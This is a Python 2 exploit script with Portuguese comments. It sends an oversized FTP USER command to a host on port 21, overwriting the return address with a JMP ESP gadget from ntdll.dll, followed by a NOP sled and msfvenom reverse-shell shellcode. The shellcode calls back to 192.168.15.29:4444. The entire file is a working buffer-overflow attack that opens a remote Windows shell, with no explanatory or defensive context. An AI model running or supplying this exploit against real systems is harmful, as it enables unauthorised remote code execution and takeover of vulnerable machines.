#!/usr/bin/python

import socket

remoteip="192.168.15.150"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((remoteip, 21))
except:
    print ("[-] Connection error!")
    sys.exit(1)

# Gerado usando: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.15.29 LPORT=4444 -b "\x00\x0a\x0d\x40" -a x86 -f python
buf =  ""
buf += "\xb8\xf6\xa1\x6d\xa9\xda\xc1\xd9\x74\x24\xf4\x5b\x31"
buf += "\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\xb5\xaf\x8f"
buf += "\x5c\xc5\x58\xcd\x9f\x35\x99\xb2\x16\xd0\xa8\xf2\x4d"
buf += "\x91\x9b\xc2\x06\xf7\x17\xa8\x4b\xe3\xac\xdc\x43\x04"
buf += "\x04\x6a\xb2\x2b\x95\xc7\x86\x2a\x15\x1a\xdb\x8c\x24"
buf += "\xd5\x2e\xcd\x61\x08\xc2\x9f\x3a\x46\x71\x0f\x4e\x12"
buf += "\x4a\xa4\x1c\xb2\xca\x59\xd4\xb5\xfb\xcc\x6e\xec\xdb"
buf += "\xef\xa3\x84\x55\xf7\xa0\xa1\x2c\x8c\x13\x5d\xaf\x44"
buf += "\x6a\x9e\x1c\xa9\x42\x6d\x5c\xee\x65\x8e\x2b\x06\x96"
buf += "\x33\x2c\xdd\xe4\xef\xb9\xc5\x4f\x7b\x19\x21\x71\xa8"
buf += "\xfc\xa2\x7d\x05\x8a\xec\x61\x98\x5f\x87\x9e\x11\x5e"
buf += "\x47\x17\x61\x45\x43\x73\x31\xe4\xd2\xd9\x94\x19\x04"
buf += "\x82\x49\xbc\x4f\x2f\x9d\xcd\x12\x38\x52\xfc\xac\xb8"
buf += "\xfc\x77\xdf\x8a\xa3\x23\x77\xa7\x2c\xea\x80\xc8\x06"
buf += "\x4a\x1e\x37\xa9\xab\x37\xfc\xfd\xfb\x2f\xd5\x7d\x90"
buf += "\xaf\xda\xab\x37\xff\x74\x04\xf8\xaf\x34\xf4\x90\xa5"
buf += "\xba\x2b\x80\xc6\x10\x44\x2b\x3d\xf3\xab\x04\x32\x1e"
buf += "\x44\x57\x4c\x31\xc8\xde\xaa\x5b\xe0\xb6\x65\xf4\x99"
buf += "\x92\xfd\x65\x65\x09\x78\xa5\xed\xbe\x7d\x68\x06\xca"
buf += "\x6d\x1d\xe6\x81\xcf\x88\xf9\x3f\x67\x56\x6b\xa4\x77"
buf += "\x11\x90\x73\x20\x76\x66\x8a\xa4\x6a\xd1\x24\xda\x76"
buf += "\x87\x0f\x5e\xad\x74\x91\x5f\x20\xc0\xb5\x4f\xfc\xc9"
buf += "\xf1\x3b\x50\x9c\xaf\x95\x16\x76\x1e\x4f\xc1\x25\xc8"
buf += "\x07\x94\x05\xcb\x51\x99\x43\xbd\xbd\x28\x3a\xf8\xc2"
buf += "\x85\xaa\x0c\xbb\xfb\x4a\xf2\x16\xb8\x7b\xb9\x3a\xe9"
buf += "\x13\x64\xaf\xab\x79\x97\x1a\xef\x87\x14\xae\x90\x73"
buf += "\x04\xdb\x95\x38\x82\x30\xe4\x51\x67\x36\x5b\x51\xa2"


buffer="A" * 485
#77F5801C   FFE4             JMP ESP ==> ntdll.dll
buffer += "\x1c\x80\xf5\x77"
buffer += "\x90"*16
buffer += buf

print s.recv(1024)
print "Mandando a maldade..."
s.send('USER ' + buffer + '\r\n')
print s.recv(1024)
print "Sending pass..."
s.send('USER LiveOverflow\r\n')
print s.recv(1024)
s.close()
